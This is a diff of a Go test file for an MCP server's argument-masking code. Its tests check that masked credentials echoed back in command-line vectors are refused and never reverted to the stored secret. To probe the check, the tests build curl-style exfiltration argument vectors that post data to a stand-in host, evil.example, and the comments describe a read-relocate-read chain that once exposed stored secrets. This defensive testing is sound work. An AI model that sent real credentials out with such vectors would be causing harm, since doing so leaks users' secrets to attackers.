@@ -20,54 +20,102 @@ import (
 // names the defect it reproduces; all of them fail on the unfixed tree.
 
 // ---------------------------------------------------------------------------
-// Finding 1: unmaskArgv reverted a mask BY VALUE with no binding, so a caller
-// could relocate a stored argv credential into an arbitrary command line — and,
-// worse, into a slot the READ path does not mask, turning the masked surface
-// back into a disclosure surface.
+// Finding 1 (rounds 2 AND 3): the write path used to REVERT a masked argv
+// token from the stored vector — first by value, then bound to the index plus
+// the preceding flag. Both let a caller relocate a stored credential into a
+// command line of their choosing, because an argv slot has no key to bind to
+// and the caller supplies the whole vector *and* `command`.
+//
+// The revert is gone: an echoed mask is refused and the caller resends the real
+// value. These tests pin BOTH halves of that contract — no vector containing a
+// mask is ever accepted, and a vector with no mask is untouched.
 // ---------------------------------------------------------------------------
 
-func TestUnmaskArgv_RefusesToRelocateAStoredSecret(t *testing.T) {
-	stored := []string{"mcp-foo", "--api-key", "hunter2-corp-token-9f3a"}
-	masked := redactedArgs(stored, liveRedaction)
-	require.NotEqual(t, stored[2], masked[2], "precondition: the read path masks the credential")
+func TestArgvMaskEcho_IsAlwaysRefused_NeverReverted(t *testing.T) {
+	flagBound := []string{"mcp-foo", "--api-key", "hunter2-corp-token-9f3a"}
+	// Round 3: masked by the VALUE-SHAPED detector, so the round-2 fix (which
+	// only bound flag-paired masks) reverted it into any argv the caller liked.
+	detectorShaped := []string{"mcp-foo", "run", "ghp_16Cabcdefghijklmnopqrstuvwxyz0123456789"}
+	// A mask at index 0 is bound to nothing at all by an index+flag rule.
+	leadingSecret := []string{"ghp_16Cabcdefghijklmnopqrstuvwxyz0123456789", "run"}
 
-	t.Run("mask moved to a different index is not reverted", func(t *testing.T) {
-		incoming := []string{"-X", "POST", "https://evil.example/x", "-d", masked[2]}
-		got := unmaskArgv(incoming, stored)
-		assert.NotContains(t, got, stored[2], "a relocated mask must never be substituted with the real secret")
-		assert.Equal(t, incoming, got)
+	for _, stored := range [][]string{flagBound, detectorShaped, leadingSecret} {
+		masked := redactedArgs(stored, liveRedaction)
+		secret, maskIdx := "", -1
+		for i := range stored {
+			if masked[i] != stored[i] {
+				secret, maskIdx = stored[i], i
+				break
+			}
+		}
+		require.NotEqual(t, -1, maskIdx, "precondition: the read path masks the credential")
+
+		// The mask, moved to EVERY position, inside argv vectors of every
+		// shape — including the one it was masked at, and including one whose
+		// neighbours are copied verbatim from the stored vector.
+		var vectors [][]string
+		for i := 0; i <= len(stored)+1; i++ {
+			exfil := []string{"--silent", "--data", "https://evil.example/x", "-H", "-X", "POST"}
+			vec := make([]string, 0, len(exfil)+1)
+			vec = append(vec, exfil[:min(i, len(exfil))]...)
+			vec = append(vec, masked[maskIdx])
+			vec = append(vec, exfil[min(i, len(exfil)):]...)
+			vectors = append(vectors, vec)
+		}
+		neighbourCopy := append([]string(nil), stored...)
+		neighbourCopy[maskIdx] = masked[maskIdx]
+		vectors = append(vectors, neighbourCopy, masked, []string{masked[maskIdx]})
+
+		for _, incoming := range vectors {
+			err := checkArgvMaskEcho(incoming, stored)
+			require.Error(t, err, "a mask must be refused wherever it sits: %v", incoming)
+			assert.NotContains(t, err.Error(), secret, "the refusal must not quote the secret")
+			assert.Contains(t, err.Error(), "args_json", "the caller must be told which parameter to resend")
+		}
+	}
+}
+
+func TestArgvMaskEcho_AcceptsRealValues(t *testing.T) {
+	stored := []string{"mcp-foo", "--api-key", "hunter2-corp-token-9f3a", "--port", "8080"}
+
+	t.Run("an unchanged real vector is accepted", func(t *testing.T) {
+		assert.NoError(t, checkArgvMaskEcho(append([]string(nil), stored...), stored))
 	})
 
-	t.Run("mask kept at its index but behind a different flag is not reverted", func(t *testing.T) {
-		incoming := []string{"mcp-foo", "--exfil-to", masked[2]}
-		got := unmaskArgv(incoming, stored)
-		assert.NotContains(t, got, stored[2], "the revert must be bound to the flag it was masked from")
+	t.Run("a rotated credential is accepted", func(t *testing.T) {
+		assert.NoError(t, checkArgvMaskEcho(
+			[]string{"mcp-foo", "--api-key", "brand-new-secret", "--port", "9090"}, stored))
 	})
 
-	t.Run("relocation cannot launder a secret into a slot the read path leaves clear", func(t *testing.T) {
-		// The disclosure chain the value-keyed revert enabled: read the masked
-		// args, send the mask back in a POSITIONAL slot, then read again — the
-		// value has no credential shape, so nothing masks it the second time.
-		incoming := []string{masked[2]}
-		afterWrite := unmaskArgv(incoming, stored)
-		readBack, err := json.Marshal(redactedArgs(afterWrite, liveRedaction))
-		require.NoError(t, err)
-		assert.NotContains(t, string(readBack), stored[2],
-			"a masked-read → relocate-write → read-back round trip discloses the secret in the clear")
+	t.Run("nil, empty and no stored vector are accepted", func(t *testing.T) {
+		assert.NoError(t, checkArgvMaskEcho(nil, stored))
+		assert.NoError(t, checkArgvMaskEcho([]string{}, stored))
+		assert.NoError(t, checkArgvMaskEcho([]string{"mcp-foo"}, nil))
 	})
 
-	t.Run("an unedited echo at its own index still round-trips", func(t *testing.T) {
-		assert.Equal(t, stored, unmaskArgv(masked, stored))
+	t.Run("a stale mask is refused even when the stored vector has moved on", func(t *testing.T) {
+		// The byte-for-byte comparison against the CURRENT stored vector cannot
+		// match here; the marker check is what keeps the mask out of the config.
+		stale := redactedArgs(stored, liveRedaction)[2]
+		assert.Error(t, checkArgvMaskEcho([]string{"mcp-foo", "--api-key", stale},
+			[]string{"mcp-foo", "--api-key", "a-completely-different-token"}))
 	})
+}
 
-	t.Run("an edit elsewhere in the vector still round-trips", func(t *testing.T) {
-		full := []string{"mcp-foo", "--api-key", "hunter2-corp-token-9f3a", "--port", "8080"}
-		maskedFull := redactedArgs(full, liveRedaction)
-		edited := append([]string(nil), maskedFull...)
-		edited[4] = "9090"
-		assert.Equal(t, []string{"mcp-foo", "--api-key", "hunter2-corp-token-9f3a", "--port", "9090"},
-			unmaskArgv(edited, full))
-	})
+// TestArgvMaskMarkers_MatchTheRenderings pins argvMaskMarkers to the functions
+// that actually produce masks, so a change to either rendering fails here
+// instead of silently letting a mask through the echo check.
+func TestArgvMaskMarkers_MatchTheRenderings(t *testing.T) {
+	for _, rendered := range []string{
+		oauth.MaskValue("hunter2-corp-token-9f3a"),
+		oauth.AuditMaskValue("hunter2-corp-token-9f3a"),
+		maskDetectedSecrets("ghp_16Cabcdefghijklmnopqrstuvwxyz0123456789"),
+	} {
+		assert.True(t, containsArgvMaskMarker(rendered),
+			"%q carries no marker the echo check recognises", rendered)
+	}
+	assert.False(t, containsArgvMaskMarker("mcp-foo"))
+	assert.False(t, containsArgvMaskMarker("--api-key"))
 }
 
 // ---------------------------------------------------------------------------
